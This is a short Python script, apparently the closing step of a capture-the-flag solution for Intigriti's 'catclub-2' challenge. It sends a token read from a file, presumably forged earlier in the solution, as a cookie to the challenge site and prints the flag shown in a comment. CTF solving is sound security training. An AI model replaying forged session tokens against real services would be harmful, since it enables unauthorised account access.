import requests

url = f"https://catclub-2.ctf.intigriti.io/cats"

with open("catclub_exp/token.txt") as f:
    token = f.read().strip()
resp = requests.get(url, cookies={"token": token})

# print(resp.text)
print(resp.text.split('alt="Club Logo"></nav></header><div class="content"><h1>')[1])

# Welcome to the Cat Gallery, INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}!</h1> ...
